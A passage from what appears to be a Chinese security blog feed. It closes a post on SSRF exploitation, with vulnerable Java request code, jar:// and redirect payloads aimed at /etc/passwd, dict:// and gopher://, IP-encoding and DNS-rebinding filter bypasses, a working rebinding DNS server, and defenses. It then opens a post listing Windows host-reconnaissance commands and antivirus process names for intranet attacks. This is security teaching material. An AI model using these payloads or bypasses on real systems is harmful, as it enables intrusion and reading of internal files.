alt=""></p><p>可以看到是支持file、ftp、http/https、jar、mailto、netdoc等协议的。</p><p>而实际上有攻击利用价值的仅为file和http/https协议。</p><h3 id="SSRF相关类"><a href="#SSRF相关类" class="headerlink" title="SSRF相关类"></a>SSRF相关类</h3><p>Java中能发起网络请求的类：</p><ul><li>HttpClient类</li><li>HttpURLConnection类</li><li>URLConnection类</li><li>URL类</li><li>OkHttp类</li><li>ImageIO类</li><li>Request类</li></ul><p>注意：Request是对HttpClient类进行了封装的类，类似于Python的requests库。其用法简单，一行代码就能获取网页内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Request.Get(url).execute().returnContent().toString();</span><br></pre></td></tr></table></figure><p>其中，仅支持HTTP/HTTPS协议的类（即类名或封装的类名带http）：</p><ul><li>HttpClient类</li><li>HttpURLConnection类</li><li>OkHttp类</li><li>Request类</li></ul><p>支持<code>sun.net.www.protocol</code>所有协议的类：</p><ul><li>URLConnection类</li><li>URL类</li><li>ImageIO类</li></ul><h3 id="漏洞示例代码"><a href="#漏洞示例代码" class="headerlink" title="漏洞示例代码"></a>漏洞示例代码</h3><p>本部分引自：<a href="https://pplsec.github.io/2018/09/19/JAVA代码审计之XXE与SSRF/" target="_blank" rel="noopener">JAVA代码审计之XXE与SSRF</a></p><p>环境搭建可使用这个项目，这里就不演示了：<a href="https://github.com/pplsec/JavaVul/tree/master/MySSRF" target="_blank" rel="noopener">https://github.com/pplsec/JavaVul/tree/master/MySSRF</a></p><h4 id="HttpURLConnection类"><a href="#HttpURLConnection类" class="headerlink" title="HttpURLConnection类"></a>HttpURLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">//HttpURLConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line"> URLConnection urlConnection = u.openConnection();  </span><br><span class="line">HttpURLConnection httpUrl = (HttpURLConnection)urlConnection;   </span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(httpUrl.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line"> StringBuffer html = <span class="keyword">new</span> StringBuffer(); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">         html.append(inputLine);</span><br><span class="line">        &#125;        </span><br><span class="line"> System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line"> in.close();</span><br></pre></td></tr></table></figure><h4 id="URLConnection类"><a href="#URLConnection类" class="headerlink" title="URLConnection类"></a>URLConnection类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//urlConnection ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">URLConnection urlConnection = u.openConnection();</span><br><span class="line">BufferedReader in = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(urlConnection.getInputStream())); <span class="comment">//发起请求,触发漏洞</span></span><br><span class="line">String inputLine;</span><br><span class="line">StringBuffer html = <span class="keyword">new</span> StringBuffer();</span><br><span class="line"><span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">     html.append(inputLine);</span><br><span class="line">&#125;        </span><br><span class="line">System.out.println(<span class="string">"html:"</span> + html.toString());</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure><h4 id="ImageIO类"><a href="#ImageIO类" class="headerlink" title="ImageIO类"></a>ImageIO类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ImageIO ssrf vul</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">BufferedImage img = ImageIO.read(u); <span class="comment">// 发起请求,触发漏洞</span></span><br></pre></td></tr></table></figure><h4 id="其他类"><a href="#其他类" class="headerlink" title="其他类"></a>其他类</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Request漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line"><span class="keyword">return</span> Request.Get(url).execute().returnContent().toString();<span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// openStream漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">URL u = <span class="keyword">new</span> URL(url);</span><br><span class="line">inputStream = u.openStream();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// OkHttpClient漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">com.squareup.okhttp.Request ok_http = <span class="keyword">new</span> com.squareup.okhttp.Request.Builder().url(url).build();</span><br><span class="line">client.newCall(ok_http).execute();  <span class="comment">//发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// HttpClients漏洞示例</span></span><br><span class="line">String url = request.getParameter(<span class="string">"url"</span>);</span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault();</span><br><span class="line">HttpGet httpGet = <span class="keyword">new</span> HttpGet(url);</span><br><span class="line">HttpResponse httpResponse = client.execute(httpGet); <span class="comment">//发起请求</span></span><br></pre></td></tr></table></figure><h3 id="特有jar-协议分析"><a href="#特有jar-协议分析" class="headerlink" title="特有jar://协议分析"></a>特有jar://协议分析</h3><p>jar://协议能从远程获取jar文件及解压得到其中的内容，其格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:&lt;url&gt;!/&#123;entry&#125;</span><br></pre></td></tr></table></figure><p>实例如下，<code>!</code>符号后面就是其需要从中解压出的文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar:http://a.com/b.jar!/file/within/the/zip</span><br></pre></td></tr></table></figure><p>jar://协议分类：</p><ul><li>Jar file（Jar包本身）：<code>jar:http://www.foo.com/bar/baz.jar!/</code></li><li>Jar entry（Jar包中某个资源文件）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/a.class</code></li><li>Jar directory（Jar包中某个目录）：<code>jar:http://www.foo.com/bar/baz.jar!/COM/foo/</code></li></ul><p>其实目前jar://协议在Java SSRF中的利用一般是获取目标jar包中的文件内容，比如某个类，其并不像其他常用的攻击协议一样能够对内网服务发起攻击。</p><p>比如下面的poc是获取目标jar包内C3P0.class文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/MySSRF/ssrf2?url=jar:http://127.0.0.1/ysoserial.jar!/ysoserial/payloads/C3P0.class</span><br></pre></td></tr></table></figure><p><img src="/2020/02/29/SSRF-Tricks小结/5.png" alt=""></p><p>这样就能看到jar包中的任何内容，如果jar包还是开发者自定义的话就会造成源码泄露，但是这个协议的利用还是很鸡肋。</p><h3 id="Weblogic-SSRF漏洞"><a href="#Weblogic-SSRF漏洞" class="headerlink" title="Weblogic SSRF漏洞"></a>Weblogic SSRF漏洞</h3><p>参考Vulhub的环境：<a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p><h2 id="0x03-SSRF-in-Python"><a href="#0x03-SSRF-in-Python" class="headerlink" title="0x03 SSRF in Python"></a>0x03 SSRF in Python</h2><p>SSRF在Python中也是一样的，漏洞点都是发起URL请求的函数的参数外部可控导致SSRf漏洞。最为经典的就是和urllib的CRLF注入漏洞的结合利用，可参考：<a href="https://security.tencent.com/index.php/blog/msg/106" target="_blank" rel="noopener">Hack Redis via Python urllib HTTP Header Injection</a></p><h2 id="0x04-URL地址过滤Bypass"><a href="#0x04-URL地址过滤Bypass" class="headerlink" title="0x04 URL地址过滤Bypass"></a>0x04 URL地址过滤Bypass</h2><p>如今，大多数站点都对存在SSRF风险的地方的URL参数进行了过滤，但开发者的水平参差不齐，会存在一些可被绕过的场景。</p><h3 id="符绕过URL白名单"><a href="#符绕过URL白名单" class="headerlink" title="@符绕过URL白名单"></a>@符绕过URL白名单</h3><p>有时候后台程序会以白名单的方式校验输入的URL参数是否为白名单中的域名或IP，但如果只校验如是否以<code>http://a.com</code>开头，则可以通过<code>@</code>符进行绕过：<code>http://a.com@10.10.10.100</code></p><p>而此时实际访问的是<code>http://10.10.10.100</code>。</p><h3 id="IP地址进制转换绕过"><a href="#IP地址进制转换绕过" class="headerlink" title="IP地址进制转换绕过"></a>IP地址进制转换绕过</h3><p>通常，一些开发者会通过某些正则表达式来过滤掉内网地址，如：</p><ul><li><code>^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</code></li><li><code>^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li><li><code>^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</code></li></ul><p>此时我们可以对IP地址进行进制转换来绕过，例如192.168.0.1这个地址可以被改写成：</p><ul><li>8进制格式：0300.0250.0.1</li><li>16进制格式：0xC0.0xA8.0.1</li><li>16进制整数格式：0xC0A80001</li><li>10进制整数格式：3232235521（先转16进制正是格式再转回10进制整数形式）</li></ul><p>其他特殊形式：</p><ul><li>10.0.0.1可以写成10.1，访问改写后的IP地址时Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作；</li><li>0.0.0.0可以直接访问到本地；</li></ul><h3 id="通过xip-io解析到内网绕过"><a href="#通过xip-io解析到内网绕过" class="headerlink" title="通过xip.io解析到内网绕过"></a>通过xip.io解析到内网绕过</h3><p>这个就不用多介绍了，例如10.0.0.1这个内网IP地址是和以下几种形式的域名等价的：</p><ul><li>10.0.0.1.xip.io</li><li><a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></li><li>mysite.10.0.0.1.xip.io</li><li>foo.bar.10.0.0.1.xip.io</li></ul><h3 id="利用IPv6绕过"><a href="#利用IPv6绕过" class="headerlink" title="利用IPv6绕过"></a>利用IPv6绕过</h3><blockquote><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::]</code> <code>0000::1</code>或IPv6的内网域名来绕过过滤。</p></blockquote><h3 id="利用IDN绕过"><a href="#利用IDN绕过" class="headerlink" title="利用IDN绕过"></a>利用IDN绕过</h3><blockquote><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code> 和 <code>example.com</code> 等同。利用这种方式，可以用 <code>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩</code> 等字符绕过内网限制。</p></blockquote><h3 id="利用30x跳转绕过"><a href="#利用30x跳转绕过" class="headerlink" title="利用30x跳转绕过"></a>利用30x跳转绕过</h3><blockquote><p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p><p>可以使用如 <a href="http://httpbin.org/redirect-to?url=http://192.168.0.1" target="_blank" rel="noopener">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p><p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p></blockquote><p>跳转常见的结合协议的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: file://etc/passwd"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: dict://127.0.0.1:666/info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">"Location: gopher://127.0.0.1:666/_info"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="DNS-Rebinding"><a href="#DNS-Rebinding" class="headerlink" title="DNS Rebinding"></a>DNS Rebinding</h3><p>DNS Rebinding可以利用于绕过SSRF以及绕过同源策略等。</p><p>这里看下利用DNS Rebinding绕过SSRF过滤URL参数的场景，有如下三种方法。</p><h4 id="特定域名实现TTL-0"><a href="#特定域名实现TTL-0" class="headerlink" title="特定域名实现TTL=0"></a>特定域名实现TTL=0</h4><p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p><p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p><p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p><ul><li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li><li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li><li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h4 id="域名绑定两条A记录"><a href="#域名绑定两条A记录" class="headerlink" title="域名绑定两条A记录"></a>域名绑定两条A记录</h4><p>四分之一的概率，当第一次解析为外网IP，第二次解析为内网IP，就会成功。</p><p><img src="/2020/02/29/SSRF-Tricks小结/6.png" alt=""></p><h4 id="自建DNS服务器"><a href="#自建DNS服务器" class="headerlink" title="自建DNS服务器"></a>自建DNS服务器</h4><p>先添加一条NS记录和一条A记录：</p><p><img src="/2020/02/29/SSRF-Tricks小结/7.png" alt=""></p><p>Ns记录表示这个子域名test.h0pe.site指定由ns.h0pe.site域名服务器解析，A记录表示ns.h0pe.site位置在ip地址x.x.x.x上。</p><p>在这个IP地址上搭建DNS服务器，采用Python的twisted库的name模块，核心代码如下，以root权限运行即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twisted.internet <span class="keyword">import</span> reactor, defer</span><br><span class="line"><span class="keyword">from</span> twisted.names <span class="keyword">import</span> client, dns, error, server</span><br><span class="line"></span><br><span class="line">record=&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicResolver</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_doDynamicResponse</span><span class="params">(self, query)</span>:</span></span><br><span class="line">        name = query.name.name</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record <span class="keyword">or</span> record[name]&lt;<span class="number">1</span>:</span><br><span class="line">            ip=<span class="string">"104.160.43.154"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ip=<span class="string">"171.18.0.2"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">not</span> <span class="keyword">in</span> record:</span><br><span class="line">            record[name]=<span class="number">0</span></span><br><span class="line">        record[name]+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">print</span> name+<span class="string">" ===&gt; "</span>+ip</span><br><span class="line"></span><br><span class="line">        answer = dns.RRHeader(</span><br><span class="line">            name=name,</span><br><span class="line">            type=dns.A,</span><br><span class="line">            cls=dns.IN,</span><br><span class="line">            ttl=<span class="number">0</span>,</span><br><span class="line">            payload=dns.Record_A(address=<span class="string">b'%s'</span>%ip,ttl=<span class="number">0</span>)</span><br><span class="line">        )</span><br><span class="line">        answers = [answer]</span><br><span class="line">        authority = []</span><br><span class="line">        additional = []</span><br><span class="line">        <span class="keyword">return</span> answers, authority, additional</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(self, query, timeout=None)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> defer.succeed(self._doDynamicResponse(query))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    factory = server.DNSServerFactory(</span><br><span class="line">        clients=[DynamicResolver(), client.Resolver(resolv=<span class="string">'/etc/resolv.conf'</span>)]</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    protocol = dns.DNSDatagramProtocol(controller=factory)</span><br><span class="line">    reactor.listenUDP(<span class="number">53</span>, protocol)</span><br><span class="line">    reactor.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">raise</span> SystemExit(main())</span><br></pre></td></tr></table></figure><h3 id="通过各种非HTTP协议"><a href="#通过各种非HTTP协议" class="headerlink" title="通过各种非HTTP协议"></a>通过各种非HTTP协议</h3><p>在某些情况下，后台会限制协议类型，如不能使用http/https。</p><p>在前面的SSRF攻击利用中提到过很多协议，如file、dict、gopher等，可以使用这些不在限制协议名单中的协议来绕过利用，具体的还得看后台语言和环境而定。</p><h2 id="0x05-漏洞组合拳"><a href="#0x05-漏洞组合拳" class="headerlink" title="0x05 漏洞组合拳"></a>0x05 漏洞组合拳</h2><h3 id="SSRF-文件解析漏洞"><a href="#SSRF-文件解析漏洞" class="headerlink" title="SSRF+文件解析漏洞"></a>SSRF+文件解析漏洞</h3><p>当某个页面存在SSRF漏洞，但限制了只能加载jpg等图片类型后缀的文件。此时可以结合如Apache解析漏洞，上传一个a.php.jpg的恶意文件，在通过SSRF漏洞来加载执行。</p><h3 id="SSRF-CRLF注入漏洞"><a href="#SSRF-CRLF注入漏洞" class="headerlink" title="SSRF+CRLF注入漏洞"></a>SSRF+CRLF注入漏洞</h3><p>如SSRF in Python中所说。</p><h3 id="SSRF-XXE漏洞"><a href="#SSRF-XXE漏洞" class="headerlink" title="SSRF+XXE漏洞"></a>SSRF+XXE漏洞</h3><p>参考bWAPP中SSRF。</p><h3 id="其他一些漏洞利用组合"><a href="#其他一些漏洞利用组合" class="headerlink" title="其他一些漏洞利用组合"></a>其他一些漏洞利用组合</h3><ul><li>Apache Hadoop远程命令执行</li><li>axis2-admin部署Server命令执行</li><li>Confluence SSRF</li><li>counchdb WEB API远程命令执行</li><li>dict</li><li>docker API远程命令执行</li><li>Elasticsearch引擎Groovy脚本命令执行</li><li>ftp / ftps（FTP爆破）</li><li>glassfish任意文件读取和war文件部署间接命令执行</li><li>gopher</li><li>HFS远程命令执行</li><li>http、https</li><li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li><li>Java调试接口命令执行</li><li>JBOSS远程Invoker war命令执行</li><li>Jenkins Scripts接口命令执行</li><li>ldap</li><li>mongodb</li><li>php_fpm/fastcgi 命令执行</li><li>rtsp - smb/smbs（连接SMB）</li><li>sftp</li><li>ShellShock命令执行</li><li>Struts2 RCE</li><li>telnet</li><li>tftp（UDP协议扩展）</li><li>tomcat命令执行</li><li>WebDav PUT上传任意文件</li><li>WebSphere Admin可部署war间接命令执行</li><li>zentoPMS远程命令执行</li></ul><h2 id="0x06-防御方法"><a href="#0x06-防御方法" class="headerlink" title="0x06 防御方法"></a>0x06 防御方法</h2><ul><li>限制协议为http/https，禁用不必要的协议；</li><li>尽量禁止30x跳转；</li><li>设置URL白名单或限制内网IP、限制请求的端口等；</li><li>统一错误信息；</li><li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单；</li></ul><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><p><a href="https://joychou.org/web/phpssrf.html" target="_blank" rel="noopener">SSRF in PHP</a></p><p><a href="https://websec.readthedocs.io/zh/latest/vuln/ssrf.html" target="_blank" rel="noopener">Web安全学习笔记-SSRF</a></p><p><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="noopener">SSRF Tips</a></p><p><a href="https://www.t00ls.net/articles-41070.html#" target="_blank" rel="noopener">SSRF漏洞(原理&amp;绕过姿势)</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="SSRF" scheme="https://www.mi1k7ea.com/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>内网信息收集之本机信息收集</title>
    <link href="https://www.mi1k7ea.com/2020/02/27/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%9C%AC%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://www.mi1k7ea.com/2020/02/27/内网信息收集之本机信息收集/</id>
    <published>2020-02-27T13:49:40.000Z</published>
    <updated>2020-03-08T13:18:45.381Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-参考"><a href="#0x00-参考" class="headerlink" title="0x00 参考"></a>0x00 参考</h2><p>《内网安全攻防》笔记。</p><h2 id="0x01-手动收集信息"><a href="#0x01-手动收集信息" class="headerlink" title="0x01 手动收集信息"></a>0x01 手动收集信息</h2><p>本机信息包括OS、权限、内网IP段、杀软、端口、服务、补丁更新频率、网络连接、共享、会话等。如果是域内主机，OS、应用软件、补丁、服务、杀软这些一般都是批量安装的。</p><h3 id="查询网络配置信息"><a href="#查询网络配置信息" class="headerlink" title="查询网络配置信息"></a>查询网络配置信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure><p>使用该命令可查看IP地址、DNS服务器、主机名、域名等信息：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/1.png" alt=""></p><h3 id="查询操作系统及软件信息"><a href="#查询操作系统及软件信息" class="headerlink" title="查询操作系统及软件信息"></a>查询操作系统及软件信息</h3><h4 id="查询操作系统名称和版本信息"><a href="#查询操作系统名称和版本信息" class="headerlink" title="查询操作系统名称和版本信息"></a>查询操作系统名称和版本信息</h4><p>分英文版和中文版：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br><span class="line">或</span><br><span class="line">systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/2.png" alt=""></p><h4 id="查看系统体系结构"><a href="#查看系统体系结构" class="headerlink" title="查看系统体系结构"></a>查看系统体系结构</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/3.png" alt=""></p><h4 id="查看安装的软件及版本、路径等"><a href="#查看安装的软件及版本、路径等" class="headerlink" title="查看安装的软件及版本、路径等"></a>查看安装的软件及版本、路径等</h4><p>利用wmic命令将结果输出到文本文件中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/4.png" alt=""></p><p>利用PowerShell命令收集软件的版本信息（当然如果已在PowerShell终端，则直接输入双引号里的命令即可）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/5.png" alt=""></p><h3 id="查询本机服务信息"><a href="#查询本机服务信息" class="headerlink" title="查询本机服务信息"></a>查询本机服务信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/6.png" alt=""></p><h3 id="查询进程列表"><a href="#查询进程列表" class="headerlink" title="查询进程列表"></a>查询进程列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><p>该命令可以查看当前进程列表和进程用户，分析软件、客户端邮件、VPN和杀毒软件等进程：</p><p><img src="/2020/02/27/内网信息收集之本机信息收集/7.png" alt=""></p><p>如下命令查看进程信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/8.png" alt=""></p><h4 id="常见杀毒软件的进程"><a href="#常见杀毒软件的进程" class="headerlink" title="常见杀毒软件的进程"></a>常见杀毒软件的进程</h4><p>如下表：</p><table><thead><tr><th>进程</th><th>软件名称</th></tr></thead><tbody><tr><td>360SD.EXE</td><td>360杀毒</td></tr><tr><td>360TRAY.EXE</td><td>360实时保护</td></tr><tr><td>ZHUDONGFANGYU.EXE</td><td>360主动防御</td></tr><tr><td>KSAFETRAY.EXE</td><td>金山卫士</td></tr><tr><td>SAFEDOGUPDATECENTER.EXE</td><td>服务器安全狗</td></tr><tr><td>MCAFEE MCSHIELD.EXE</td><td>迈克菲杀毒软件</td></tr><tr><td>EGUI.EXE</td><td>NOD32</td></tr><tr><td>AVP.EXE</td><td>卡巴斯基</td></tr><tr><td>AVGUARD.EXE</td><td>小红伞</td></tr><tr><td>BDAGENT.EXE</td><td>BITDEFENDER</td></tr></tbody></table><h3 id="查询启动程序信息"><a href="#查询启动程序信息" class="headerlink" title="查询启动程序信息"></a>查询启动程序信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure><p><img src="/2020/02/27/内网信息收集之本机信息收集/9.png" alt=""></p><h3 id="查询计划任务"><a href="#查询计划任务" class="headerlink" 